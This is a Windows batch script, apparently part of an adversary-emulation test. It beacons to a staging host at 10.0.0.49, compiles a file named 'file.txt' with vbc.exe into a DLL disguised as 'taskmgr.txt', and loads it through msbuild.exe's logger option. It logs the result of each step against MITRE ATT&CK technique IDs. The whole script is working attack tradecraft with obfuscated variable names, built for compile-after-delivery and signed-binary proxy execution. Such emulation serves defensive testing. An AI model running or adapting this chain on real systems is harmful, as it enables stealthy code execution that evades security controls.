@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET recnn=%APPDATA%\8801\3ddba176
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?8801-7
SET lqyereup=ITZEL-S2BS
SET ufeybybm=7
SET hpnjatpj=taskmgr.txt
SET njozco=file.txt
SET kkjwr=8801

SET otugbx=%APPDATA%\%ufeybybm%\macula-simulations.log
SET bxbnhx=%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\vbc.exe
SET hhzzwr=%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe

echo [%DATE% %TIME%][DEBUG][%lqyereup%]: heartbeat_start=!uouoq!>> "!otugbx!" 2>nul
curl -k -s -o nul "!uouoq!"
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: heartbeat_complete=!ERRORLEVEL!>> "!otugbx!" 2>nul

echo [%DATE% %TIME%][DEBUG][%lqyereup%]: chdir_start=!recnn!>> "!otugbx!" 2>nul
cd /d "!recnn!" >nul 2>&1
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: chdir_result=!CD!>> "!otugbx!" 2>nul

SET bfgcdt=1&SET rpbyda=
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: compile_start=!njozco!>> "!otugbx!" 2>nul
!bxbnhx! /target:library /reference:Microsoft.Build.Framework.dll "!njozco!" /out:"!hpnjatpj!" >nul 2>&1
IF !ERRORLEVEL! NEQ 0 SET bfgcdt=0&SET rpbyda=compile_failed
echo [%DATE% %TIME%][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile After Delivery=!bfgcdt!:!rpbyda!>> "!otugbx!" 2>nul
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: compile_complete=!bfgcdt!>> "!otugbx!" 2>nul

IF !bfgcdt! EQU 1 (
  SET zlwmgy=1&SET mmkvpb=
  echo [%DATE% %TIME%][DEBUG][%lqyereup%]: msbuild_logger_start=!hpnjatpj!>> "!otugbx!" 2>nul
  !hhzzwr! /logger:LoggerEntry,"!recnn!\\!hpnjatpj!";MyParameters,Foo >nul 2>&1
  IF !ERRORLEVEL! NEQ 0 SET zlwmgy=0&SET mmkvpb=execution_failed
  echo [%DATE% %TIME%][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|Signed Binary Proxy Execution=!zlwmgy!:!mmkvpb!>> "!otugbx!" 2>nul
  echo [%DATE% %TIME%][DEBUG][%lqyereup%]: msbuild_logger_complete=!zlwmgy!>> "!otugbx!" 2>nul
)